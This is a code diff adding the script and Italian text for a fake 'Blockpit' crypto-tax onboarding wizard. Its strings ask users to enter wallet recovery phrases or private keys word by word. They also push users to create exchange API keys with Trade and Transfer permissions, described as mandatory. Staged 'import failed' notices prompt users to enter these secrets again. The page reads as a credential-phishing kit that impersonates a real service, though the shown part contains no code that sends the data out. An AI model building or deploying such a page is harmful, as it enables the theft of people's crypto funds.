+                    optExchange: 'Exchange', optExchangeDesc: 'Binance, Coinbase, Kraken e altri',
+                    optWallet: 'Wallet', optWalletDesc: 'MetaMask, Ledger, Trezor e altri',
+                    optManual: 'Manuale / CSV', optManualDesc: 'Carica un file CSV o Excel',
+                    holdTitle: 'Dove conservi le tue crypto?',
+                    holdSubtitle: 'Sincronizza il tuo portafoglio, connetti un’integrazione per l’accesso in sola lettura alle tue transazioni.',
+                    searchPh: 'Cerca',
+                    pillAll: 'Tutti', pillBlockchain: 'Blockchain', pillWallet: 'Wallet', pillExchange: 'Exchange', pillTaxTool: 'Tax Tool', pillExcel: 'Blockpit Excel',
+                    noResults: 'Nessuna integrazione trovata.',
+                    addTitle: 'Aggiungi {name}',
+                    bcDesc: 'Collega il tuo wallet tramite WalletConnect per importare le tue transazioni. Le tue credenziali restano protette e solo tu puoi muovere i tuoi fondi.',
+                    exDesc: 'Accedi al tuo conto exchange per importare le tue transazioni. Le tue credenziali restano protette, solo tu puoi muovere i tuoi fondi.',
+                    apiDesc: 'Configura chiavi API di sola lettura per importare le tue transazioni. Le tue credenziali restano protette, solo tu puoi muovere i tuoi fondi.',
+                    infoBc: 'Come eseguo il pairing del mio wallet?',
+                    infoEx: 'Come collego il mio account?',
+                    infoApi: 'Come creo le mie chiavi API?',
+                    nameLabel: 'Nome',
+                    bcPh: 'Indirizzo blockchain',
+                    apiKeyPh: 'Chiave API',
+                    apiSecretPh: 'Secret API',
+                    connectBtn: 'Connetti',
+                    tabConnect: 'Connetti account',
+                    tabApi: 'API',
+                    helpTitle: 'Come importare dati tramite connessione diretta {name} o chiave API?',
+                    helpQ1: 'Come collego direttamente il mio account {name}?',
+                    helpQ2: 'Come creo le chiavi API su {name}?',
+                    helpS1a: 'Per importare i tuoi dati, devi prima creare un’<b>Integrazione</b> nella Blockpit Web App. Vai alla voce di menu <b>Integrazioni</b> nella tua <b>Dashboard</b> e clicca su <b>+Integration</b>.',
+                    helpS1b: 'Seleziona <b>{name}</b> dall’elenco e clicca su <b>Connetti</b>.',
+                    helpS2a: 'Accedi al tuo account {name} e apri le impostazioni delle chiavi API.',
+                    helpS2b: 'Crea una nuova chiave API e attiva tutte le autorizzazioni (interessi): <b>View (read-only)</b>, <b>Trade (execute trades on your behalf)</b> e <b>Transfer (initiate transfer of funds)</b>. Tutte le autorizzazioni sono necessarie per il funzionamento della connessione.',
+                    helpS2c: 'Conferma con <b>Create &amp; download</b> e copia la tua <b>chiave API</b> e il tuo <b>Secret</b>.',
+                    permView: 'View (read-only)',
+                    permTrade: 'Trade (execute trades on your behalf)',
+                    permTradeReq: 'obbligatorio, altrimenti la connessione non funzionerà',
+                    permTransfer: 'Transfer (initiate transfer of funds)',
+                    helpWarn: 'Ti preghiamo di copiare SEMPRE la chiave API completa e la chiave privata (secret), altrimenti riceverai un messaggio di errore!',
+                    connectWallet: 'Connetti wallet',
+                    soonChip: 'presto',
+                    manualInt: 'Integrazione manuale',
+                    phraseLenLabel: 'Parole',
+                    phraseTitle: 'Frase di recupero',
+                    phraseHint: 'Suggerimento: incolla l’intera frase in qualsiasi casella — verrà compilata automaticamente.',
+                    phraseCount: '{n} di {total} parole',
+                    syncLoading: 'Importo le tue transazioni…',
+                    syncFail: 'Non siamo riusciti a importare i tuoi dati da {name}. Inserisci di nuovo la tua frase di recupero e riprova.',
+                    syncFailApi: 'Non siamo riusciti a importare i tuoi dati da {name}. Controlla la tua API key e il secret — assicurati di aver attivato tutte le autorizzazioni (View, Trade, Transfer) — inseriscili di nuovo e riprova.',
+                    syncFailDirect: 'Non siamo riusciti a importare i tuoi dati da {name}. La connessione diretta non è al momento disponibile. Riprova più tardi oppure usa le API key.',
+                    noticePhrase: 'Non siamo riusciti a importare i tuoi dati da {name}. <b>Controlla bene la tua frase di recupero</b> — ogni parola deve essere scritta esattamente come nel tuo wallet e nell’ordine corretto — poi inseriscila di nuovo.',
+                    noticeBtnPhrase: 'Controlla e reinserisci la frase',
+                    noticeApi: 'Non siamo riusciti a importare i tuoi dati da {name}. <b>Controlla bene la tua API key e il secret</b> — e assicurati di aver attivato <b>tutte le autorizzazioni</b> (View, Trade, Transfer) — poi inseriscili di nuovo.',
+                    noticeBtnApi: 'Controlla e reinserisci le API key',
+                    tryAgain: 'Riprova',
+                    syncDone: 'Importazione riuscita! Ti porto alla dashboard…',
+                    helpWalletTitle: 'Come importo i dati dal mio wallet {name}?',
+                    helpWQ1: 'Come eseguo il pairing del mio wallet {name}?',
+                    helpWS2: 'Clicca <b>Connetti wallet</b> in alto — si apre una richiesta di pairing (codice QR o link all’app). Approva la richiesta nell’app del tuo wallet <b>{name}</b> oppure collegati direttamente tramite WalletConnect',
+                    wcChip: 'WalletConnect',
+                    helpWQ2: 'Il pairing non ha funzionato — come aggiungo il mio wallet manualmente?',
+                    helpWS3: 'Usa l’<b>integrazione manuale</b>: apri il tuo wallet e mostra la tua <b>frase di recupero</b> oppure copia la tua <b>chiave privata</b> (le trovi nelle impostazioni di sicurezza o backup del wallet). Inseriscila qui sotto parola per parola per completare il pairing.',
+                    helpWS4: 'Suggerimento: puoi incollare l’intera frase in qualsiasi casella — verrà compilata automaticamente. Anche la tua <b>chiave privata</b> funziona.',
+                    helpWarnWallet: 'La tua frase di recupero è preziosa come il wallet stesso — non condividerla mai con nessuno.',
+                    connectFail: 'Impossibile connettersi a {name}. Approva la richiesta di pairing nell’app del tuo wallet e riprova, oppure usa l’integrazione manuale qui sotto.',
+                    overviewTitle: 'Tutto pronto!',
+                    overviewSubtitle: 'Ecco un riepilogo della configurazione. Puoi cambiare tutto in seguito.',
+                    goToDashboard: 'Vai alla dashboard',
+                    chatName: 'Supporto Blockpit',
+                    chatStatus: 'Risponde di solito in pochi minuti',
+                    chatWelcome: 'Ciao! 👋 Come possiamo aiutarti con le tue tasse crypto oggi?',
+                    chatPlaceholder: 'Scrivi un messaggio…',
+                    chatReply: 'Grazie per il tuo messaggio! Un agente del supporto ti risponderà a breve. Nel frattempo, dai un’occhiata al nostro Help Center.',
+                    countries: {
+                        us: 'Stati Uniti', de: 'Germania', at: 'Austria', ch: 'Svizzera',
+                        it: 'Italia', gb: 'Regno Unito', fr: 'Francia', es: 'Spagna',
+                        nl: 'Paesi Bassi', ca: 'Canada', au: 'Australia', other: 'Altro paese'
+                    }
+                }
+            };
+
+            var COUNTRIES = [
+                { code: 'us', flag: '🇺🇸' }, { code: 'de', flag: '🇩🇪' },
+                { code: 'at', flag: '🇦🇹' }, { code: 'ch', flag: '🇨🇭' },
+                { code: 'it', flag: '🇮🇹' }, { code: 'gb', flag: '🇬🇧' },
+                { code: 'fr', flag: '🇫🇷' }, { code: 'es', flag: '🇪🇸' },
+                { code: 'nl', flag: '🇳🇱' }, { code: 'ca', flag: '🇨🇦' },
+                { code: 'au', flag: '🇦🇺' }, { code: 'other', flag: '🌍' }
+            ];
+
+            function detectLang() {
+                var m = /[?&]lang=([a-z]{2})(-[a-z]{2})?/i.exec(location.search);
+                if (m && T[m[1].toLowerCase()]) {
+                    try { localStorage.setItem('blockpit-lang', m[1].toLowerCase()); } catch (e) {}
+                    return m[1].toLowerCase();
+                }
+                var ref = document.referrer || '';
+                if (/de-(de|at|ch)/i.test(ref)) return 'de';
+                if (/(\/it\.html|\/it\/)/i.test(ref)) return 'it';
+                try {
+                    var saved = localStorage.getItem('blockpit-lang');
+                    if (saved && T[saved]) return saved;
+                } catch (e) {}
+                var nav = (navigator.language || navigator.userLanguage || 'en').toLowerCase();
+                if (nav.indexOf('de') === 0) return 'de';
+                if (nav.indexOf('it') === 0) return 'it';
+                return 'en';
+            }
+
+            var lang = detectLang();
+            var dict = T[lang];
+            document.documentElement.lang = lang === 'en' ? 'en' : (lang === 'de' ? 'de' : 'it');
+
+            function applyI18n() {
+                document.querySelectorAll('[data-i18n]').forEach(function (el) {
+                    var k = el.getAttribute('data-i18n');
+                    if (dict[k] !== undefined) el.innerHTML = dict[k];
+                });
+                document.querySelectorAll('[data-i18n-ph]').forEach(function (el) {
+                    var k = el.getAttribute('data-i18n-ph');
+                    if (dict[k] !== undefined) el.placeholder = dict[k];
+                });
+            }
+
+            /* ---------- Wizard state ---------- */
+            var state = {
+                step: 1,
+                country: 'us',
+                portfolio: 'exchange'
+            };
+            try {
+                var saved = JSON.parse(localStorage.getItem('blockpit-setup') || '{}');
+                if (saved.country) state.country = saved.country;
+                if (saved.portfolio) state.portfolio = saved.portfolio;
+            } catch (e) {}
+
+            function persist() {
+                try { localStorage.setItem('blockpit-setup', JSON.stringify({ country: state.country, portfolio: state.portfolio })); } catch (e) {}
+            }
+
+            function countryMeta(code) {
+                for (var i = 0; i < COUNTRIES.length; i++) {
+                    if (COUNTRIES[i].code === code) return COUNTRIES[i];
+                }
+                return COUNTRIES[COUNTRIES.length - 1];
+            }
+
+            function countryName(code) {
+                return (dict.countries && dict.countries[code]) || code;
+            }
+
+            function renderCountry() {
+                var meta = countryMeta(state.country);
+                document.getElementById('countryFlag').textContent = meta.flag;
+                document.getElementById('countryName').textContent = countryName(state.country);
+                document.getElementById('summaryCountry').textContent = meta.flag + ' ' + countryName(state.country);
+            }
+
+            function renderPortfolio() {
+                document.getElementById('summaryPortfolio').textContent = state.portfolio;
+            }
+
+            function goToStep(n) {
+                state.step = n;
+                document.querySelectorAll('.step').forEach(function (el) {
+                    var s = parseInt(el.getAttribute('data-step'), 10);
+                    el.classList.toggle('active', s === n);
+                    el.classList.toggle('done', s < n);
+                });
+                document.querySelectorAll('.step-pane').forEach(function (el) {
+                    el.classList.toggle('active', parseInt(el.getAttribute('data-pane'), 10) === n);
+                });
+                window.scrollTo(0, 0);
+            }
+
+            /* ---------- Country dropdown ---------- */
+            var countrySelect = document.getElementById('countrySelect');
+            var countryDropdown = document.getElementById('countryDropdown');
+
+            function renderDropdown() {
+                countryDropdown.innerHTML = '';
+                COUNTRIES.forEach(function (c) {
+                    var opt = document.createElement('div');
+                    opt.className = 'country-option' + (c.code === state.country ? ' selected' : '');
+                    opt.setAttribute('role', 'option');
+                    opt.innerHTML = '<span style="font-size:1.4rem;line-height:1;">' + c.flag + '</span> ' + countryName(c.code);
+                    opt.addEventListener('click', function (ev) {
+                        ev.stopPropagation();
+                        state.country = c.code;
+                        persist();
+                        renderCountry();
+                        countryDropdown.classList.remove('open');
+                        countrySelect.setAttribute('aria-expanded', 'false');
+                    });
+                    countryDropdown.appendChild(opt);
+                });
+            }
+
+            countrySelect.addEventListener('click', function (ev) {
+                ev.stopPropagation();
+                var open = countryDropdown.classList.toggle('open');
+                countrySelect.setAttribute('aria-expanded', open ? 'true' : 'false');
+            });
+            document.addEventListener('click', function () {
+                countryDropdown.classList.remove('open');
+                countrySelect.setAttribute('aria-expanded', 'false');
+            });
+
+            /* ---------- Continue buttons ---------- */
+            document.getElementById('continueBtn1').addEventListener('click', function () { goToStep(2); });
+            document.getElementById('finishBtn').addEventListener('click', function () {
+                try { localStorage.setItem('blockpit-setup-complete', '1'); } catch (e) {}
+                window.location.href = 'dashboard.html';
+            });
+
+
+            /* ---------- Integration picker ---------- */
+            var INTEGRATIONS = [
+                { name: "Bitcoin", cat: 'blockchain', img: 'assets/integrations/bitcoin-blockchain.svg' },
+                { name: "Ethereum", cat: 'blockchain', img: 'assets/integrations/ethereum-blockchain.svg' },
+                { name: "Solana", cat: 'blockchain', img: 'assets/integrations/solana-blockchain.svg' },
+                { name: "Bitpanda", cat: 'exchange', img: 'assets/integrations/bitpanda-exchange.svg' },
+                { name: "Binance", cat: 'exchange', img: 'assets/integrations/binance-exchange.svg' },
+                { name: "Coinbase", cat: 'exchange', img: 'assets/integrations/coinbase-exchange.svg' },
+                { name: "Ledger", cat: 'wallet', img: 'assets/integrations/ledger-wallet.svg' },
+                { name: "MetaMask", cat: 'wallet', img: 'assets/integrations/metamask-wallet.svg' },
+                { name: "Phantom", cat: 'wallet', img: 'assets/integrations/phantom-wallet.svg' },
+                { name: "Polygon", cat: 'blockchain', img: 'assets/integrations/polygon-blockchain.svg' },
+                { name: "Bitvavo", cat: 'exchange', img: 'assets/integrations/bitvavo-exchange.svg' },
+                { name: "BNB Smart Chain (BSC)", cat: 'blockchain', img: 'assets/integrations/bnb-smart-chain-bsc-blockchain.svg' },
+                { name: "Bitget", cat: 'exchange', img: 'assets/integrations/bitget-exchange.svg' },
+                { name: "XRP", cat: 'blockchain', img: 'assets/integrations/xrp-blockchain.svg' },
+                { name: "Cardano", cat: 'blockchain', img: 'assets/integrations/cardano-blockchain.svg' },
+                { name: "Base", cat: 'blockchain', img: 'assets/integrations/base-blockchain.svg' },
+                { name: "MEXC Global", cat: 'exchange', img: 'assets/integrations/mexc-global-exchange.svg' },
+                { name: "KuCoin", cat: 'exchange', img: 'assets/integrations/kucoin-exchange.svg' },
+                { name: "Tangem", cat: 'wallet', img: 'assets/integrations/tangem-wallet.png' },
+                { name: "Kraken", cat: 'exchange', img: 'assets/integrations/kraken-exchange.svg' },
+                { name: "1inch", cat: 'wallet', img: 'assets/integrations/1inch-wallet.svg' },
+                { name: "21bitcoin", cat: 'exchange', img: 'assets/integrations/21bitcoin-exchange.svg' },
+                { name: "42-coin", cat: 'blockchain', img: 'assets/integrations/42-coin-blockchain.png' },
+                { name: "Abra", cat: 'wallet', img: 'assets/integrations/abra-wallet.svg' },
+                { name: "Accounting", cat: 'taxtool', img: 'assets/integrations/accounting-taxtool.png' },
+                { name: "Adalite", cat: 'wallet', img: 'assets/integrations/adalite-wallet.svg' },
+                { name: "Advcash", cat: 'wallet', img: 'assets/integrations/advcash-wallet.svg' },
+                { name: "AirGap", cat: 'wallet', img: 'assets/integrations/airgap-wallet.svg' },
+                { name: "Algorand", cat: 'blockchain', img: 'assets/integrations/algorand-blockchain.svg' },
+                { name: "Anycoin Direct", cat: 'exchange', img: 'assets/integrations/anycoin-direct-exchange.svg' },
+                { name: "Aptos", cat: 'blockchain', img: 'assets/integrations/aptos-blockchain.webp' },
+                { name: "AQUA", cat: 'blockchain', img: 'assets/integrations/aqua-blockchain.png' },
+                { name: "AquariusCoin", cat: 'blockchain', img: 'assets/integrations/aquariuscoin-blockchain.png' },
+                { name: "Arbitrum", cat: 'blockchain', img: 'assets/integrations/arbitrum-blockchain.svg' },
+                { name: "Arbitrum Nova", cat: 'blockchain', img: 'assets/integrations/arbitrum-nova-blockchain.svg' },
+                { name: "Arculus", cat: 'wallet', img: 'assets/integrations/arculus-wallet.svg' },
+                { name: "Argent", cat: 'wallet', img: 'assets/integrations/argent-wallet.svg' },
+                { name: "Argoneum", cat: 'blockchain', img: 'assets/integrations/argoneum-blockchain.png' },
+                { name: "Armory", cat: 'wallet', img: 'assets/integrations/armory-wallet.svg' },
+                { name: "Artbyte", cat: 'blockchain', img: 'assets/integrations/artbyte-blockchain.png' },
+                { name: "AscendEX", cat: 'exchange', img: 'assets/integrations/ascendex-exchange.svg' },
+                { name: "Atani Exchange", cat: 'exchange', img: 'assets/integrations/atani-exchange-exchange.svg' },
+                { name: "Atomic", cat: 'wallet', img: 'assets/integrations/atomic-wallet.svg' },
+                { name: "Auroracoin", cat: 'blockchain', img: 'assets/integrations/auroracoin-blockchain.png' },
+                { name: "Avalanche C-Chain", cat: 'blockchain', img: 'assets/integrations/avalanche-c-chain-blockchain.png' },
+                { name: "B3Coin", cat: 'blockchain', img: 'assets/integrations/b3coin-blockchain.png' },
+                { name: "Backpack", cat: 'wallet', img: 'assets/integrations/backpack-wallet.svg' },
+                { name: "Bake (Cake DeFi)", cat: 'exchange', img: 'assets/integrations/bake-cake-defi-exchange.svg' },
+                { name: "Binance US", cat: 'exchange', img: 'assets/integrations/binance-us-exchange.svg' },
+                { name: "Base Wallet", cat: 'wallet', img: 'assets/integrations/base-wallet-wallet.svg' },
+                { name: "BeeNode", cat: 'wallet', img: 'assets/integrations/beenode-wallet.webp' },
+                { name: "Berachain", cat: 'blockchain', img: 'assets/integrations/berachain-blockchain.svg' },
+                { name: "Best Wallet", cat: 'wallet', img: 'assets/integrations/best-wallet-wallet.jpg' },
+                { name: "Biblepay", cat: 'blockchain', img: 'assets/integrations/biblepay-blockchain.png' },
+                { name: "Bifrost", cat: 'wallet', img: 'assets/integrations/bifrost-wallet.svg' },
+                { name: "BingX", cat: 'exchange', img: 'assets/integrations/bingx-exchange.png' },
+                { name: "Bison", cat: 'exchange', img: 'assets/integrations/bison-exchange.svg' },
+                { name: "BitBox", cat: 'wallet', img: 'assets/integrations/bitbox-wallet.svg' },
+                { name: "BitCloud", cat: 'wallet', img: 'assets/integrations/bitcloud-wallet.png' },
+                { name: "Bitcoin Cash", cat: 'blockchain', img: 'assets/integrations/bitcoin-cash-blockchain.svg' },
+                { name: "Bitcoin.de", cat: 'exchange', img: 'assets/integrations/bitcoin-de-exchange.svg' },
+                { name: "BitcoinPlus", cat: 'blockchain', img: 'assets/integrations/bitcoinplus-blockchain.svg' },
+                { name: "BitCore", cat: 'blockchain', img: 'assets/integrations/bitcore-blockchain.svg' },
+                { name: "Bitfinex", cat: 'exchange', img: 'assets/integrations/bitfinex-exchange.svg' },
+                { name: "BitFlyer", cat: 'exchange', img: 'assets/integrations/bitflyer-exchange.svg' },
+                { name: "Bitget Wallet", cat: 'wallet', img: 'assets/integrations/bitget-wallet-wallet.svg' },
+                { name: "BitLox", cat: 'wallet', img: 'assets/integrations/bitlox-wallet.png' },
+                { name: "BitMart", cat: 'exchange', img: 'assets/integrations/bitmart-exchange.svg' },
+                { name: "BitMEX", cat: 'exchange', img: 'assets/integrations/bitmex-exchange.svg' },
+                { name: "BitSend", cat: 'blockchain', img: 'assets/integrations/bitsend-blockchain.svg' },
+                { name: "Bitstamp", cat: 'exchange', img: 'assets/integrations/bitstamp-exchange.svg' },
+                { name: "Bittensor", cat: 'blockchain', img: 'assets/integrations/bittensor-blockchain.svg' },
+                { name: "Bitunix", cat: 'exchange', img: 'assets/integrations/bitunix-exchange.webp' },
+                { name: "Bitwala", cat: 'exchange', img: 'assets/integrations/bitwala-exchange.png' },
+                { name: "BlackCoin", cat: 'blockchain', img: 'assets/integrations/blackcoin-blockchain.svg' },
+                { name: "BlackFort BXN", cat: 'wallet', img: 'assets/integrations/blackfort-bxn-wallet.svg' },
+                { name: "BlakeBitcoin", cat: 'blockchain', img: 'assets/integrations/blakebitcoin-blockchain.png' },
+                { name: "BlakeCoin", cat: 'blockchain', img: 'assets/integrations/blakecoin-blockchain.png' },
+                { name: "Blast", cat: 'blockchain', img: 'assets/integrations/blast-blockchain.svg' },
+                { name: "Blockchain.com", cat: 'wallet', img: 'assets/integrations/blockchain-com-wallet.svg' },
+                { name: "Blockchain.com Exchange", cat: 'exchange', img: 'assets/integrations/blockchain-com-exchange-exchange.svg' },
+                { name: "Blocknet", cat: 'blockchain', img: 'assets/integrations/blocknet-blockchain.svg' },
+                { name: "Blockpit Excel", cat: 'taxtool', img: 'assets/integrations/blockpit-excel-taxtool.png' },
+                { name: "BolivarCoin", cat: 'blockchain', img: 'assets/integrations/bolivarcoin-blockchain.png' },
+                { name: "Brave Wallet", cat: 'wallet', img: 'assets/integrations/brave-wallet-wallet.svg' },
+                { name: "BRD", cat: 'wallet', img: 'assets/integrations/brd-wallet.svg' },
+                { name: "BSDEX", cat: 'exchange', img: 'assets/integrations/bsdex-exchange.webp' },
+                { name: "ByBit", cat: 'exchange', img: 'assets/integrations/bybit-exchange.svg' },
+                { name: "ByBit EU", cat: 'exchange', img: 'assets/integrations/bybit-eu-exchange.png' },
+                { name: "BYTZ", cat: 'blockchain', img: 'assets/integrations/bytz-blockchain.png' },
+                { name: "Cake Wallet", cat: 'wallet', img: 'assets/integrations/cake-wallet-wallet.png' },
+                { name: "Cannacoin", cat: 'blockchain', img: 'assets/integrations/cannacoin-blockchain.png' },
+                { name: "Casa", cat: 'wallet', img: 'assets/integrations/casa-wallet.svg' },
+                { name: "Celestia", cat: 'blockchain', img: 'assets/integrations/celestia-blockchain.svg' },
+                { name: "Certurium", cat: 'blockchain', img: 'assets/integrations/certurium-blockchain.png' },
+                { name: "ChessCoin 0,32%", cat: 'blockchain', img: 'assets/integrations/chesscoin-0-32-blockchain.png' },
+                { name: "Choise", cat: 'wallet', img: 'assets/integrations/choise-wallet.svg' },
+                { name: "Citadel.one", cat: 'exchange', img: 'assets/integrations/citadel-one-exchange.svg' },
+                { name: "Citadel.one Wallet", cat: 'wallet', img: 'assets/integrations/citadel-one-wallet-wallet.svg' },
+                { name: "CloakCoin", cat: 'blockchain', img: 'assets/integrations/cloakcoin-blockchain.svg' },
+                { name: "Coin98", cat: 'wallet', img: 'assets/integrations/coin98-wallet.svg' },
+                { name: "Coinbase Pro", cat: 'exchange', img: 'assets/integrations/coinbase-pro-exchange.svg' },
+                { name: "CoinEx", cat: 'exchange', img: 'assets/integrations/coinex-exchange.svg' },
+                { name: "Coinfinity", cat: 'exchange', img: 'assets/integrations/coinfinity-exchange.svg' },
+                { name: "Coinomi", cat: 'wallet', img: 'assets/integrations/coinomi-wallet.svg' },
+                { name: "CoinStats", cat: 'taxtool', img: 'assets/integrations/coinstats-taxtool.svg' },
+                { name: "CoinTracking", cat: 'taxtool', img: 'assets/integrations/cointracking-taxtool.png' },
+                { name: "ColossusXT", cat: 'blockchain', img: 'assets/integrations/colossusxt-blockchain.png' },
+                { name: "CoolWallet", cat: 'wallet', img: 'assets/integrations/coolwallet-wallet.svg' },
+                { name: "Cosmos", cat: 'blockchain', img: 'assets/integrations/cosmos-blockchain.svg' },
+                { name: "Cronos", cat: 'blockchain', img: 'assets/integrations/cronos-blockchain.svg' },
+                { name: "Cronos POS", cat: 'blockchain', img: 'assets/integrations/cronos-pos-blockchain.svg' },
+                { name: "Crown", cat: 'blockchain', img: 'assets/integrations/crown-blockchain.svg' },
+                { name: "Crypto.com App", cat: 'exchange', img: 'assets/integrations/crypto-com-app-exchange.svg' },
+                { name: "Crypto.com DeFi Wallet", cat: 'wallet', img: 'assets/integrations/crypto-com-defi-wallet-wallet.svg' },
+                { name: "Crypto.com Exchange", cat: 'exchange', img: 'assets/integrations/crypto-com-exchange-exchange.svg' },
+                { name: "Cryptoshares", cat: 'blockchain', img: 'assets/integrations/cryptoshares-blockchain.jpg' },
+                { name: "CryptoWallet", cat: 'wallet', img: 'assets/integrations/cryptowallet-wallet.svg' },
+                { name: "CTRL", cat: 'wallet', img: 'assets/integrations/ctrl-wallet.png' },
+                { name: "D'CENT", cat: 'wallet', img: 'assets/integrations/d-cent-wallet.png' },
+                { name: "Dash", cat: 'blockchain', img: 'assets/integrations/dash-blockchain.svg' },
+                { name: "deblock", cat: 'wallet', img: 'assets/integrations/deblock-wallet.png' },
+                { name: "DeFiChain", cat: 'blockchain', img: 'assets/integrations/defichain-blockchain.svg' },
+                { name: "Deribit", cat: 'exchange', img: 'assets/integrations/deribit-exchange.svg' },
+                { name: "Deutsche eMark", cat: 'blockchain', img: 'assets/integrations/deutsche-emark-blockchain.png' },
+                { name: "Diamond", cat: 'blockchain', img: 'assets/integrations/diamond-blockchain.svg' },
+                { name: "DigiByte", cat: 'blockchain', img: 'assets/integrations/digibyte-blockchain.png' },
+                { name: "DigiFinex", cat: 'exchange', img: 'assets/integrations/digifinex-exchange.svg' },
+                { name: "DigitalCoin", cat: 'blockchain', img: 'assets/integrations/digitalcoin-blockchain.png' },
+                { name: "Digitalmoneybits", cat: 'blockchain', img: 'assets/integrations/digitalmoneybits-blockchain.png' },
+                { name: "Dimecoin", cat: 'blockchain', img: 'assets/integrations/dimecoin-blockchain.svg' },
+                { name: "Divi", cat: 'blockchain', img: 'assets/integrations/divi-blockchain.svg' },
+                { name: "Divicoin", cat: 'blockchain', img: 'assets/integrations/divicoin-blockchain.jpg' },
+                { name: "Dogecoin", cat: 'blockchain', img: 'assets/integrations/dogecoin-blockchain.svg' },
+                { name: "Dogmcoin", cat: 'blockchain', img: 'assets/integrations/dogmcoin-blockchain.png' },
+                { name: "e-Gulden", cat: 'blockchain', img: 'assets/integrations/e-gulden-blockchain.png' },
+                { name: "EarthCoin", cat: 'blockchain', img: 'assets/integrations/earthcoin-blockchain.png' },
+                { name: "ECC", cat: 'blockchain', img: 'assets/integrations/ecc-blockchain.png' },
+                { name: "Edge", cat: 'wallet', img: 'assets/integrations/edge-wallet.svg' },
+                { name: "Eidoo", cat: 'wallet', img: 'assets/integrations/eidoo-wallet.svg' },
+                { name: "Einsteinium", cat: 'blockchain', img: 'assets/integrations/einsteinium-blockchain.svg' },
+                { name: "Electron", cat: 'blockchain', img: 'assets/integrations/electron-blockchain.png' },
+                { name: "Electrum", cat: 'wallet', img: 'assets/integrations/electrum-wallet.svg' },
+                { name: "Element", cat: 'wallet', img: 'assets/integrations/element-wallet.webp' },
+                { name: "Elite", cat: 'blockchain', img: 'assets/integrations/elite-blockchain.png' },
+                { name: "Ellipal", cat: 'wallet', img: 'assets/integrations/ellipal-wallet.svg' },
+                { name: "Emerald", cat: 'wallet', img: 'assets/integrations/emerald-wallet.png' },
+                { name: "EnergyCoin", cat: 'blockchain', img: 'assets/integrations/energycoin-blockchain.png' },
+                { name: "EOS", cat: 'blockchain', img: 'assets/integrations/eos-blockchain.svg' },
+                { name: "Eternl", cat: 'wallet', img: 'assets/integrations/eternl-wallet.png' },
+                { name: "Ethereum Classic", cat: 'blockchain', img: 'assets/integrations/ethereum-classic-blockchain.svg' },
+                { name: "eToro", cat: 'exchange', img: 'assets/integrations/etoro-exchange.svg' },
+                { name: "EverGreenCoin", cat: 'blockchain', img: 'assets/integrations/evergreencoin-blockchain.png' },
+                { name: "Exodus", cat: 'wallet', img: 'assets/integrations/exodus-wallet.svg' },
+                { name: "Gemini", cat: 'exchange', img: 'assets/integrations/gemini-exchange.svg' },
+                { name: "Gnosis", cat: 'blockchain', img: 'assets/integrations/gnosis-blockchain.svg' },
+                { name: "GoldCoin", cat: 'blockchain', img: 'assets/integrations/goldcoin-blockchain.gif' },
+                { name: "Green Bitcoin Wallet", cat: 'wallet', img: 'assets/integrations/green-bitcoin-wallet-wallet.svg' },
+                { name: "Groestlcoin", cat: 'blockchain', img: 'assets/integrations/groestlcoin-blockchain.png' },
+                { name: "Guarda", cat: 'wallet', img: 'assets/integrations/guarda-wallet.svg' },
+                { name: "HitBTC", cat: 'exchange', img: 'assets/integrations/hitbtc-exchange.svg' },
+                { name: "HolyTransaction", cat: 'wallet', img: 'assets/integrations/holytransaction-wallet.svg' },
+                { name: "HTMLCOIN", cat: 'blockchain', img: 'assets/integrations/htmlcoin-blockchain.svg' },
+                { name: "HTX", cat: 'exchange', img: 'assets/integrations/htx-exchange.svg' },
+                { name: "HyperEVM", cat: 'blockchain', img: 'assets/integrations/hyperevm-blockchain.svg' },
+                { name: "I/O Coin", cat: 'blockchain', img: 'assets/integrations/i-o-coin-blockchain.png' },
+                { name: "ICoin", cat: 'blockchain' },
+                { name: "ImageCoin", cat: 'blockchain', img: 'assets/integrations/imagecoin-blockchain.png' },
+                { name: "imToken", cat: 'wallet', img: 'assets/integrations/imtoken-wallet.svg' },
+                { name: "Indodax", cat: 'exchange', img: 'assets/integrations/indodax-exchange.svg' },
+                { name: "InfiniLooP", cat: 'blockchain', img: 'assets/integrations/infiniloop-blockchain.png' },
+                { name: "Infinitecoin", cat: 'blockchain', img: 'assets/integrations/infinitecoin-blockchain.png' },
+                { name: "INK", cat: 'blockchain', img: 'assets/integrations/ink-blockchain.svg' },
+                { name: "Innova", cat: 'blockchain', img: 'assets/integrations/innova-blockchain.png' },
+                { name: "IOTA (Stardust)", cat: 'blockchain', img: 'assets/integrations/iota-stardust-blockchain.png' },
+                { name: "IOTA EVM", cat: 'blockchain', img: 'assets/integrations/iota-evm-blockchain.svg' },
+                { name: "IOTA Rebased", cat: 'blockchain', img: 'assets/integrations/iota-rebased-blockchain.svg' },
+                { name: "Jade", cat: 'wallet', img: 'assets/integrations/jade-wallet.svg' },
+                { name: "Jaxx", cat: 'wallet', img: 'assets/integrations/jaxx-wallet.svg' },
+                { name: "JTX", cat: 'blockchain' },
+                { name: "Juno", cat: 'blockchain', img: 'assets/integrations/juno-blockchain.svg' },
+                { name: "Jupiter Wallet", cat: 'wallet', img: 'assets/integrations/jupiter-wallet-wallet.png' },
+                { name: "justTRADE", cat: 'exchange', img: 'assets/integrations/justtrade-exchange.webp' },
+                { name: "Kaspa", cat: 'blockchain', img: 'assets/integrations/kaspa-blockchain.svg' },
+                { name: "KeepKey", cat: 'wallet', img: 'assets/integrations/keepkey-wallet.svg' },
+                { name: "Keplr", cat: 'wallet', img: 'assets/integrations/keplr-wallet.svg' },
+                { name: "Klaytn", cat: 'blockchain', img: 'assets/integrations/klaytn-blockchain.svg' },
+                { name: "Kobocoin", cat: 'blockchain', img: 'assets/integrations/kobocoin-blockchain.png' },
+                { name: "Koinly", cat: 'taxtool', img: 'assets/integrations/koinly-taxtool.png' },
+                { name: "Kraken Futures", cat: 'exchange', img: 'assets/integrations/kraken-futures-exchange.svg' },
+                { name: "Kusama (legacy)", cat: 'blockchain', img: 'assets/integrations/kusama-legacy-blockchain.svg' },
+                { name: "Kusama AssetHub", cat: 'blockchain', img: 'assets/integrations/kusama-assethub-blockchain.svg' },
+                { name: "Lanacoin", cat: 'blockchain', img: 'assets/integrations/lanacoin-blockchain.png' },
+                { name: "Latoken", cat: 'exchange', img: 'assets/integrations/latoken-exchange.svg' },
+                { name: "LCX", cat: 'exchange', img: 'assets/integrations/lcx-exchange.webp' },
+                { name: "Leap", cat: 'wallet', img: 'assets/integrations/leap-wallet.svg' },
+                { name: "Magi", cat: 'blockchain', img: 'assets/integrations/magi-blockchain.png' },
+                { name: "Magnum Wallet", cat: 'wallet', img: 'assets/integrations/magnum-wallet-wallet.svg' },
